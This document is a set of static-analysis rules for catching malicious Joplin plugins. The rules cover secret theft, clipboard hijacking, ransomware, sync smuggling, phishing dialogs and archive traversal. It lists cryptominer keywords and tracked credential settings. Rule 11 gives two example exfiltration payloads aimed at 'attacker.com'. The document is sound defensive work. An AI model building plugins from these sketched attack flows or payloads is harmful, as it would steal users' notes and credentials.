# Rule 1 : Dynamic Code Execution

Detects remote content executed as code rather than treated as data.

### Flows :

Sources:

- `fetch()` / `axios.get()` / `axios.post()` / `axios()` / `http.get()` / `https.get()` / `got()` / `superagent()`
- `"message"` / `"data"` event listener parameter
- `joplin.data.userDataGet()` (smuggled payload — links to Rule 12)

Sinks:

- `eval()` / `new Function()` / `Function()` (without `new`)
- `setTimeout()` / `setInterval()` first argument (string form)
- `vm.runInNewContext()` / `vm.runInThisContext()` / `vm.runInContext()` / `vm.compileFunction()` / `new vm.Script()`

### Messages :

Remote data flows to dynamic code execution.  
**Reviewer Action:** Verify endpoint is a trusted Joplin service. If execution is intended, require code signing and content-hash validation.

### Severity : error

# Rule 2 : Secret and Key Theft

Detects Joplin's internal sensitive settings (sync cache, master password, API tokens, cached encryption keys) flowing into exfiltration-capable sinks.

### Flows :

Sensitive settings tracked: `api.token`, `encryption.masterPassword`, `encryption.cachedPpk`, `encryption.passwordCache`, `syncInfoCache`, `sync.*.password`, `sync.*.auth`, `sync.*.context`, `sync.*.userEmail`, `sync.userId`, `clientId`.

1.  joplin.settings.globalValue(sensitive setting) -> network sink (fetch/axios/http/WebSocket)
2.  joplin.settings.globalValue(sensitive setting) -> filesystem path sink (writeFile/rename/unlink path argument)
3.  joplin.settings.globalValue(sensitive setting) -> filesystem data sink (writeFile content argument)
4.  joplin.settings.globalValue(sensitive setting) -> command execution sink (child_process argument)
5.  joplin.settings.globalValue(sensitive setting) -> Joplin-specific sink (`joplin.data.put`, `panels.setHtml`, `contentScripts.register`, `joplin.data.userDataSet`)
6.  Same flows via globalValues() array form.

### Messages :

Critical Security Alert: Sensitive configuration data (such as a master password, sync cache, encryption keys, or API tokens) is flowing directly to an external or untrusted sink.
**Reviewer Action:** This is highly suspicious behavior. Confirm whether the plugin has a legitimate, fully disclosed reason to touch credentials. Ensure this data is never exposed to network logs, user-interface text panels, or unencrypted local cache files.

### Severity : error

# Rule 3 : Unauthorized FS Access / Self-Modification

Filesystem access outside the plugin sandbox, or self-modification after install.

### Flows :

1. `__dirname` / `__filename` -> `writeFile` / `rm` / `unlink` / `rename` / `copyFile` path argument
2. `process.cwd()` -> filesystem path sink
3. `app.getPath()` / `electron.app.getPath()` -> filesystem path sink
4. `os.homedir()` / `os.tmpdir()` -> filesystem path sink
5. `path.join(__dirname, ...)` / `path.resolve(__dirname, ...)` -> filesystem path sink
6. **Self-modification**: `__dirname` + `index.js` / `main.js` / `plugin.js` -> `writeFile` / `writeFileSync`
7. **Config targeting**: any path source -> sink where path contains `.config/joplin-desktop` / `database.sqlite` / `.ssh`

### Notes :

- Flow 6 (bare `require("fs")` as source) removed — module import is a capability not a source, causes massive false positives on any legitimate fs-using plugin.
- Whitelist: flows where path is derived from `joplin.plugins.dataDir()` should be excluded.
- `fs-extra` destructive methods (`outputFile`, `move`, `emptyDir`) should be included as sinks alongside native `fs`.

### Messages :

Unauthorized File System Access: Plugin uses path-revealing variables to write or delete files outside the Joplin sandbox.  
**Reviewer Action:** Plugins must use `joplin.plugins.dataDir()` exclusively. Self-modification of `index.js`/`main.js` post-install is confirmed malicious.

### Severity : error

# Rule 4 : Network Backdoor

Detects server-creation objects flowing into a receiver of .listen() / .bind() / .start() to open a local port.

### Flows :

1.  net.createServer() / http.createServer() / https.createServer() / tls.createServer() result -> receiver of .listen() call
2.  dgram.createSocket() result -> receiver of .bind() call
3.  new ws.Server(...) instance -> receiver of .listen() / .start() call
4.  express() / koa() / fastify() app instance -> receiver of .listen() call

### Messages :

Network Backdoor Detected: The plugin is opening a local listening port (via `net`, `http`, or frameworks like `Express`) to accept incoming connections.
**Reviewer Action:** Check if the plugin explicitly advertises running a local server (e.g., a companion web app). If this is undocumented, it acts as a backdoor. Verify that the server binds securely (e.g., localhost only) and requires explicit authentication.

### Severity : error

# Rule 5 : Clipboard Hijacking

Clipboard content read, replaced, or exfiltrated silently.

### Flows :

1. `joplin.clipboard.readText()` -> `clipboard.writeText()` / `writeHtml()` (read-then-replace)
2. `fetch()` / `axios` / remote source -> `clipboard.writeText()` / `writeHtml()` (inject remote payload)
3. `joplin.clipboard.readText()` -> network exfiltration sink (exfiltration)
4. `joplin.clipboard.readText()` inside `setInterval` / unbounded loop (background polling)
5. `clipboard.writeText()` inside `setInterval` (continuous silent replacement)
6. `joplin.clipboard.readText()` -> `eval()` / `child_process` (clipboard content executed)

### Notes :

- Flow 3 (any string literal -> writeText) removed — fires on every copy-to-clipboard feature, unusable noise.

### Messages :

Clipboard Hijacking: Plugin reads and replaces clipboard with remote or arbitrary data.  
**Reviewer Action:** Verify triggered by explicit user action. Silent background replacement may inject malicious wallet addresses or URLs.

Clipboard Exfiltration: Plugin reads clipboard and transmits contents over network.  
**Reviewer Action:** Severe privacy violation. Verify explicit user consent.

### Severity : error

# Rule 6 : Native Binary Dropping & Cryptojacking

Remote payloads or cryptominer keywords flowing into command execution.

### Flows :

1. `fetch()` / `axios` / `http.get()` / `got()` result -> `child_process` argument
2. String literal matching `xmrig` / `minerd` / `ethminer` / `cgminer` / `t-rex` / `nsfminer` / `stratum+tcp` / `pool.` / `nicehash` -> command execution sink
3. Remote source -> `fs.writeFileSync()` + `fs.chmodSync("+x")` + `child_process.exec()` (download-drop-execute chain)
4. (Escalation): any of above with `{shell: true}` in `spawn()` / `execFile()` options

### Messages :

High-Risk Execution: Plugin downloads external payload or contains cryptominer keywords passed to a terminal command.  
**Reviewer Action:** Audit command payload for silent malware install or CPU hijacking.

[ELEVATED] High-Risk Execution: Same as above with `{shell: true}` — input is shell-interpreted, trivially weaponizable.  
**Reviewer Action:** Critical finding. Reject unless fully justified.

### Severity : error

# Rule 7 : Command Execution (Catch-All)

Residual command execution detection for flows not covered by Rules 2 or 6.

### Flows :

1. `joplin.settings.globalValue()` (non-sensitive setting) -> command execution sink
2. `joplin.data.get()` -> command execution sink
3. `joplin.workspace.selectedNote()` -> command execution sink
4. `joplin.data.userDataGet()` -> command execution sink (smuggled payload — links Rule 12)
5. User-controlled function parameter -> command execution sink
6. String literal (non-miner) -> command execution sink

### Notes :

- Explicitly exclude flows already fired by Rule 2 (sensitive settings) and Rule 6 (miner keywords) to suppress duplicate alerts.
- Flow 5 scoped to user-controlled parameters only — bare "any function parameter" fires on every plugin using `child_process` legitimately.

### Messages :

Terminal Command Execution: Generic data or Joplin settings passed to `child_process`.  
**Reviewer Action:** Lowest-specificity check — cross-reference Rule 2 and Rule 6. Verify inputs are sanitized against command injection.

### Severity : warning

# Rule 8 : Data Exfiltration

Bulk-reading notes/resources and piping to network sinks.

### Flows :

1. `joplin.data.get(["notes"])` (full list) -> network exfiltration sink
2. `joplin.data.get(["folders"])` (full list) -> network exfiltration sink
3. `joplin.data.get(["resources"])` (full list) -> network exfiltration sink
4. `joplin.data.get(["master_keys"])` -> network exfiltration sink
5. `joplin.workspace.selectedNote()` -> network exfiltration sink
6. `joplin.data.get(["notes", id])` (single targeted read) -> network sink

### Messages :

Data Exfiltration Warning: The plugin is bulk-reading notes, folders, or resources and sending that data to an external network endpoint.  
**Reviewer Action:** Verify the plugin is a legitimate sync/export tool. Confirm destination server is trusted and user-disclosed.

### Severity : warning

# Rule 9 : Mass Encryption / Ransomware

Three-stage taint tracking connecting note reads → encryption → Joplin data overwrites.

### Flows :

1. `joplin.data.get()` / `selectedNote()` -> `cipher.update()` / `encrypt()` / `crypto.createCipheriv()` / `crypto.createCipher()`
2. Encryption result -> `joplin.data.put()` body argument (overwrite)
3. Same-note correlation: read source ID matches write path ID
4. **Encryption key -> network exfiltration sink** (ransom key exfil — confirms malicious intent)
5. Above flows inside a loop over all notes (bulk/mass ransomware variant)

### Messages :

Ransomware Pattern Detected: Notes are being read, encrypted, and overwritten in-place.  
**Reviewer Action:** Verify the user holds decryption keys locally and action is strictly opt-in. If encryption key flows to a network sink, treat as confirmed ransomware.

### Severity : warning (encryption only) / error (encryption + key exfil)

# Rule 10 : Silent Backup Hijacking (Taint + Structural)

Detects data from an export module flowing into a network, child_process, or unauthorized file system sink (bypassing the legitimate export path).

### Flows :

1.  onProcessItem / onProcessResource parameters -> network exfiltration sink
2.  onInit / onClose context parameter -> network exfiltration sink
3.  Any of the above source parameters -> command execution sink
4.  Any of the above source parameters -> file-write data sink (ONLY IF destination path is NOT tainted by context)
5.  (Structural Variant): Any network/exec/file-write call lexically inside a registerExportModule callback.

### Messages :

[High Confidence] Backup Hijacking Alert: Export data is confirmed flowing into a network request, terminal command, or unauthorized file path instead of the legitimate export destination.
**Reviewer Action:** Verify if the plugin is quietly siphoning off backup data during a user-initiated export. Ensure all exported data strictly writes to the context's designated safe destination path.

[Low Confidence] Backup Hijacking Indicator: A network, execution, or file-write call exists lexically inside an export callback, but direct data flow isn't confirmed by taint tracking.
**Reviewer Action:** Manual trace required. Verify if the execution/network call is legitimately part of the export process or if it is acting as a blind trigger/exfiltration vector.

### Severity : error (Taint) / warning (Structural)

# Rule 11 : Remote Webview Scripts (Taint + Structural)

Detects webviews or content scripts loading external URLs or leaking data via src attributes.

### Flows :

1. `fetch()` / `axios` / `http.get()` / `got()` response -> `setHtml()` / `dialogs.setHtml()` (containing `<script>` / `<iframe>` / `<img>`)
2. `process.env` / `joplin.settings` -> `setHtml()` HTML argument
3. Hardcoded external URL string literal -> `setHtml()` / `contentScripts.register()` third argument
4. URL Smuggling: `joplin.data.get()` / `joplin.settings.globalValue()` -> `setHtml()` containing `src` attribute
5. Missing: `<meta http-equiv="refresh" content="0;url=https://attacker.com">` in `setHtml()` (redirect exfil)
6. (Structural): Any `setHtml()` / `contentScripts.register()` call — very low confidence, high noise

### Messages :

Remote Webview Injection: External URL injected into a Webview or Content Script.  
**Reviewer Action:** Confirm URL is trusted. Unverified remote scripts bypass plugin updates and execute arbitrary UI code.

URL Smuggling: Sensitive data flows into a Webview `src` attribute, silently exfiltrating to external server logs via `<img src="attacker.com/?data=SECRET">`.  
**Reviewer Action:** Verify no sensitive data is appended as query parameters to remote tags.

### Severity : warning

### Notes :

- Flow 6 structural variant should be gated as `@problem.severity recommendation` — fires on every panel-using plugin.
- `contentScripts.register()` third argument index unverified against real Joplin API.

# Rule 12 : Sync Smuggling (Intra-API Exfiltration)

Exfiltrating data via hidden userDataSet sync values or executing smuggled payloads.

### Flows :

1. `joplin.data.get(["notes"|"folders"|"resources"|"master_keys", id])` -> `joplin.data.userDataSet()` (smuggling in)
2. `joplin.data.userDataGet()` -> `eval()` / `new Function()` / `child_process` / `vm` (smuggled execution)
3. `joplin.data.userDataGet()` -> network exfiltration sink (smuggled exfiltration)
4. `joplin.data.get(["notes"])` bulk read -> `userDataSet()` (mass note content hidden in metadata)

### Messages :

Sync Smuggling (Write): Sensitive note or key data is being copied into a note's invisible `userDataSet` metadata — a stealth exfiltration channel that syncs silently across devices.  
**Reviewer Action:** Verify why the plugin duplicates sensitive content into hidden metadata the user cannot inspect.

Sync Smuggling (Execute): Hidden `userDataSet` content is being read and passed to an execution or network sink — indicating a stealthy RCE or exfiltration trigger.  
**Reviewer Action:** This is a critical finding. A plugin may be using sync as a C2 channel to receive and execute remote commands.

### Severity : error

# Rule 13 : Social Engineering & UI Phishing

Spoofing authentication interfaces to harvest credentials.

### Flows :

1. `joplin.views.dialogs.setHtml()` containing `<input type="password">` / fake branding -> form submission -> network exfiltration sink
2. `joplin.views.dialogs.open()` result -> network exfiltration sink
3. `panels.onMessage()` callback (capturing form data) -> network exfiltration sink
4. Any dialog HTML containing keywords: `"password"`, `"token"`, `"dropbox"`, `"github"`, `"onedrive"` -> network sink

### Messages :

UI Phishing Indicator: Data submitted through a custom Joplin dialog is being transmitted to an external network endpoint.  
**Reviewer Action:** Review dialog HTML for `<input type="password">`, fake Joplin/provider branding, or credential field names. Legitimate plugins never need to harvest sync provider passwords — those are managed exclusively by Joplin core.

### Severity : error

# Rule 14 : Resource Exhaustion & Quota DoS

Sabotaging application indexing via unbounded programmatic entity creation.

### Flows :

1. `joplin.data.post(["tags"|"notes"|"resources", ...])` inside unbounded `setInterval` (no `clearInterval`)
2. `joplin.data.post()` inside `for` / `while` / `do-while` / recursive `setTimeout`
3. `fs.writeFileSync()` generating large binary blobs inside any loop (disk quota exhaustion)
4. `joplin.data.post(["tags"])` chained immediately to `joplin.data.post(["tags", id, "notes"])` in a loop (tag-to-note link flooding, search index corruption)

### Messages :

Resource Exhaustion (Flooding): The plugin is rapidly creating tags, notes, resources, or large files inside an unbounded loop or background interval.  
**Reviewer Action:** This can corrupt Joplin's search index and exhaust disk/cloud storage quotas. Confirm the loop is strictly bounded by a finite, user-controlled limit and is not infinite or attacker-controlled.

### Severity : warning

# Rule 15 : Semantic Integrity Sabotage (Gaslighting)

Silently modifying user notes inside workspace event hooks.

### Flows :

1. `workspace.onNoteSelectionChange()` callback -> `joplin.data.put()` / `delete()` in same function
2. `workspace.onNoteChange()` / `onNoteContentChange()` callback -> `joplin.data.put()` / `delete()` in same function
3. `workspace.onNoteAlarmTrigger()` callback -> `joplin.data.put()` / `delete()` in same function
4. Any above hook -> `joplin.commands.execute()` with text-modifying commands (e.g. `insertText`, `replaceSelection`)

### Messages :

Semantic Sabotage: The plugin is silently modifying or deleting notes directly inside a workspace event hook.  
**Reviewer Action:** Modifying a note the moment a user clicks on it or triggers an alarm mimics "gaslighting" malware (word replacement, date shifting, silent deletion). Ensure modifications are explicit, user-initiated, and visible — not silent background edits.

### Severity : error

### Notes :

- Structural check — fires if call exists lexically inside hook, regardless of condition guards.
- Indirect flows (hook stores note ID, modification happens later outside hook) require taint tracking and are not covered here.

# Rule 16 : Electron Main Process Takeover

Gaining direct access to the main Electron process to control the app window or bypass renderer restrictions.

### Flows :

1.  require("@electron/remote") or import ... from "@electron/remote"
2.  require("electron").remote or import access to electron.remote

### Messages :

Critical Violation (Main Process Takeover): The plugin is attempting to import or require `@electron/remote` or `electron.remote`.
**Reviewer Action:** This completely bypasses the plugin sandbox and grants full control over the Joplin application window and the OS. This must be strictly prohibited and removed before publishing.

### Severity : error

# Rule 16b : Unauthorized Electron API Usage

Direct usage of native Electron APIs bypassing Joplin's plugin architecture.

### Flows :

1. `require("electron")` / `import "electron"` (bare import)
2. `electron.BrowserWindow` / `dialog` / `app` / `clipboard` / `shell` / `ipcRenderer` / `ipcMain` / `screen` / `webContents` / `session` / `protocol`

### Messages :

Unauthorized Native API Usage: The plugin is importing the raw `electron` module directly.  
**Reviewer Action:** Direct Electron API usage bypasses Joplin's sanctioned architecture. `ipcMain`/`ipcRenderer` enables main-process takeover; `session`/`protocol` enables request interception; `webContents` enables arbitrary script injection. Instruct the developer to use official Joplin API equivalents where available.

### Severity : warning

# Rule 17a : Untrusted Archive Extraction

Extracting remotely-fetched archives without validation.

### Flows :

1. `fetch()` / `axios` / `http.get()` / `got()` response -> `writeFile()` / `writeFileSync()` -> `archiveExtract(sourcePath)`
2. Remote response -> `archiveExtract()` sourcePath directly (in-memory, no write step)
3. User-controlled input -> `archiveExtract()` sourcePath (attacker supplies archive path)

### Messages :

Unsafe Archive Extraction: An archive downloaded from the network or controlled by user input is being extracted to disk.  
**Reviewer Action:** Verify the archive source is trusted, the download is integrity-checked (hash/signature), and extraction output is scoped to `joplin.plugins.dataDir()`. Combined with a path traversal bug this enables arbitrary file overwrite.

### Severity : warning

# Rule 17b : Unsafe Archive Extraction Destination

Extracting archives to paths outside the plugin's safe data directory.

### Flows :

1. `archiveExtract(src, dest)` where `dest` is NOT derived from `joplin.plugins.dataDir()` or `joplin.plugins.installationDir()`
2. `archiveExtract(src, dest)` where `dest` is derived from user input, remote fetch, or `process.env`
3. `archiveExtract(src, dest)` where `dest` is a hardcoded path outside plugin directories (e.g. `~/.config`, `__dirname`)

### Messages :

Unsafe Extraction Destination: An archive is being extracted to a path that is not safely derived from the plugin's isolated data directory.  
**Reviewer Action:** Extraction destination must derive from `joplin.plugins.dataDir()`. Paths from user input, remote sources, or hardcoded system locations risk overwriting `database.sqlite`, SSH keys, or shell configs.

### Severity : warning

# Rule 17c : Archive Entry Traversal

Using unsanitized archive entry names in filesystem paths (Zip Slip).

### Flows :

1. `archiveExtract()` result -> `ArchiveEntry` -> `.name` / `.entryName` -> filesystem path sink
2. `archiveExtract()` result -> `ArchiveEntry` -> `.name` / `.entryName` -> `child_process` sink (execute extracted file at traversed path)

### Messages :

Path Traversal Risk (Zip Slip): Unsanitized file names from inside an extracted archive are flowing directly into file system paths or command execution.  
**Reviewer Action:** Ensure the plugin sanitizes archive entry names (blocking `../` and absolute paths) before writing to disk or executing. Zip Slip can silently overwrite `database.sqlite`, config files, or drop executables outside the target directory.

### Severity : warning

# Rule 18 : Mass Data Destruction

Iterating through notes/folders to permanently destroy the database.

### Flows :

1. `joplin.data.delete(["folders", ...])` — unconditional, cascades to all child notes
2. `joplin.data.delete(...)` inside unbounded `while(true)` / `for(;;)` / `setInterval` / recursive `setTimeout` / `.forEach` or `.map` over a note/folder ID array
3. `joplin.data.put(...)` inside any loop where payload sets `deleted_time` or `is_conflict`
4. `joplin.data.put(...)` inside any loop where payload sets `body: ""` (content wipe)

### Messages :

Mass Data Destruction: The plugin is either deleting an entire folder (which cascades to all its notes) or looping to delete/soft-delete many items at once.  
**Reviewer Action:** This can permanently destroy the user's database. Verify this is a legitimate bulk-management feature explicitly initiated by the user. If a loop is used, ensure it is bounded by finite, safe limits and not attacker-controlled.

### Severity : warning

# Rule 19 : Keylogging & Silent Surveillance

Monitoring user notes and exfiltrating data.

### Flows :

1.  workspace.onNoteContentChange / onNoteChange / onNoteSelectionChange / onSyncStart / onSyncComplete / onResourceChange / onNoteAlarmTrigger
    callback parameter -> network exfiltration sink
2.  settings.onChange / editor.onUpdate / filters.on / panels.onMessage callback parameter -> network exfiltration sink

### Messages :

Data captured from a workspace, settings, or sync event hook is being sent directly to a network endpoint. This captures live user activity (e.g., settings changes, post-sync harvesting, or editor keystrokes).

### Severity : error

# Rule 20 : Native Module Imports

Bypassing joplin.require to gain host access.

### Flows :

1.  require() / import of fs , net , os , dgram , child_process , tls , http , https , sqlite3 , or better-sqlite3 (with or without "node:"prefix)

### Messages :

The plugin is directly importing a core Node.js native module (like `fs`, `net`, or `child_process`) without using `joplin.require`.

### Severity : error

# Rule 21 : Malicious Import Module

Detects if data read from an imported file inside `registerImportModule` flows to a dangerous sink.

### Flows :

1. `onExec(context)` callback's context parameter -> network exfiltration sink
2. `onExec(context)` callback's context parameter -> `context.sourcePath` -> `readFile / readJSON` -> network or command execution sink
3. `onExec(context)` callback's context parameter -> `context.sourcePath` -> `readFile` -> file system write sink (payload drop outside safe directory)

### Messages :

Data read during a custom `registerImportModule` execution is flowing into a dangerous sink (network request, command execution, or unauthorized file write).

### Severity : warning
